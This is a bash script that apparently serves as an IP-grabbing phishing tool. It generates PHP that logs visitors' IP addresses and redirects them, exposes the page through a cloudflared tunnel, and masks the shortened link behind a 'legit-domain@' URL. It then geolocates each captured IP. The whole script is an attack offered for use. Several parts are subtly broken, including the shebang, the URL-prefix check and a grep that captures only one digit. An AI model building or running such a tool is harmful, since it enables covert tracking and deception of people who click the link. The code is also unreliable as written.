#!bin/bash

download(){
    url=$1
    file=$(basename $url)
    curl -skf --retry-connrefused --retry 5 --retry-delay 3 -Lo "${file}" "${url}"

    if [[ -e "$file" ]]; then
        if [[ ${file#.} = "zip" ]]; then
            unzip -qq $file -d .server

        elif [[ ${file#.} = "tgz" ]]; then
            tar -zxf $file -C .server

        else
            mv -f $file .server
        fi
        
        chmod +x .server/cloudflared
        rm -rf $file

        else
            echo "Download failed"
    fi
}

get_info(){
    ip=$1
    info=$(curl -s "http://ip-api.com/json/$ip")
    echo "$info" | jq .
}

ini_cloud(){
    cloud_path=$(locate cloudflared | grep -Pv '/[^/]+\.[^/]+$')
    cloud_dir=$(dirname "$cloud_path")

    cd "$cloud_dir" && rm -f .cld.log > /dev/null 2>&1

    if [[ $(command -v termux-chroot) ]]; then
        sleep 2 && termux-chroot ./cloudflared tunnel -url "$host":"$port" --logfile .cld.log > /dev/null 2>&1 &
    else
       sleep 2 && ./cloudflared tunnel -url "$host":"$port" --logfile .cld.log > /dev/null 2>&1 &
    fi
    sleep 10
    fkurl=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" ".cld.log")
}

make_php(){
    url=$1

if [[ ! -e "ip.php" ]]; then
    cat <<EOF > ip.php
    <?php
        if (isset(\$_SERVER['HTTP_CLIENT_IP'])) {
            \$ip_address = \$_SERVER['HTTP_CLIENT_IP'];
        }

        elseif (isset(\$_SERVER['HTTP_X_FORWARDED_FOR'])) {
            \$ip_address = \$_SERVER['HTTP_X_FORWARDED_FOR'];
        }

        elseif (isset(\$_SERVER['REMOTE_ADDR'])) {
            \$ip_address = \$_SERVER['REMOTE_ADDR'];
        }


        if(strpos(\$ip_address, ',') !== false){
            \$ip_address = preg_split("/\\,/", \$ip_address)[0];
        }        
        

        \$file = fopen("ip.txt", "a");
        fwrite(\$file, "IP: " . \$ip_address);
        fclose(\$file);
    ?>
EOF
fi

    cat <<EOF > index.php
    <?php
    require 'ip.php';

    header("Location: $url");
    exit();
    ?>
EOF
php -S "$host":"$port" > /dev/null 2>&1 &
}

loc=$(pwd)
host='127.0.0.1'
port='8080'
mkdir -p .server

if which jq > /dev/null 2>&1; then
    :
else
    sudo apt install jq > /dev/null 2>&1
fi

if locate cloudflared > /dev/null 2>&1; then
    :
else
    echo "Downloading Cloudflared"
    arch=$(uname -m)
    if [[ ("$arch" == *"arm"*) || ("$arch" == *"Android"*) ]]; then
       download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"

    elif [[ "$arch" == *"aarch64"* ]]; then 
       download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"

    elif [[ "$arch" == *"x86_64"* ]]; then
       download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    fi
fi

proc=(php cloudflared)
for process in ${proc}; do
    if [[ $(pidof ${process}) ]]; then
    sudo killall ${process} > /dev/null 2>&1
    fi
done

echo -n "Insert a valid url like 'https://anything.com': "
read msk
if [[ "$msk" != http://* ]] || [[ "$msk" != https://* ]]; then
    msk="https://$msk.com"
fi

echo "[-] Starting"
cd .server && rm -f index.php
make_php "$msk"
ini_cloud
cd "$loc"

req=$(curl -s https://ulvis.net/api.php?url=${fkurl})
ulvis=${req#https://}
new_url=$msk@$ulvis
echo "$new_url"

echo "[-] Info: "
while true; do
    if [[ -e ".server/ip.txt" ]]; then
        ip=$(grep -o "^[0-9]" ".server/ip.txt")
        echo "$ip"
        get_info "$ip"
        echo -e "\n\n"
        rm -f .server/ip.txt
    fi
done